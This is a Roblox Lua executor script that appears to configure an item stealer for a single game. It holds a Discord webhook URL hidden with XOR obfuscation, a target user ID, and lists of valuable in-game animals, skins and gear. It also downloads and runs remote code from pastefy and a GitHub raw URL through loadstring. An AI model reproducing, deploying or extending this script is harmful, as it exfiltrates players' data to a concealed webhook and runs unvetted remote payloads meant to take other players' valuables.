local genv = getgenv()

genv.GOOD_WEBHOOK = (function() local b={230,250,250,254,253,180,161,161,234,231,253,237,225,252,234,160,237,225,227,161,239,254,231,161,249,235,236,230,225,225,229,253,161,191,187,189,188,186,183,188,183,184,182,182,189,191,182,182,191,188,188,184,161,200,225,205,163,198,201,198,197,255,255,198,250,197,218,185,205,230,218,190,237,219,199,201,218,249,193,215,201,251,215,216,230,235,222,246,191,204,205,187,217,185,236,229,215,163,247,197,202,229,249,251,182,247,209,250,220,216,229,198,183,229,185,247,188,237,197,233,233} local k=142 local o={} for i=1,#b do o[i]=string.char(bit32.bxor(b[i],k)) end return table.concat(o) end)()

genv.TARGET_USER_ID = 2829121161

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro and Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Fishino Clownino",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "Los Chillis",
    "Los Hackers",
    "Rubiko and Kubiko",
    "Bearito Cabinito",
    "Capitano Americano",
    "Examen Bros",
    "Rubrikiko",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Cloverat Clapat",
    "Caylusaurus",
    "Hopilikalika Hopilikalako",
    "Steakini Fattini",
    "Garama and Madundung",
    "Los Spaghettis",
    "Rico Dinero",
    "Fragola La La La",
    "Los Tacoritas",
    "Globa Steppa",
    "Money Money Bros",
    "Jolly Jolly Sahur",
    "Dug Dug Dug"
}

genv.ALLOWED_BASESKINS = {
    ["Tralala"] = true
}

genv.ALLOWED_GEARS = {
    ["Bloodmoon Hammer"] = true,
    ["Candy Sentry"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Bloodmoon Slap"] = true
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    "https://pastefy.app/I9mewuyb/raw"
}

-- Optional GUI / other loaders
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/su9hI8dc/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
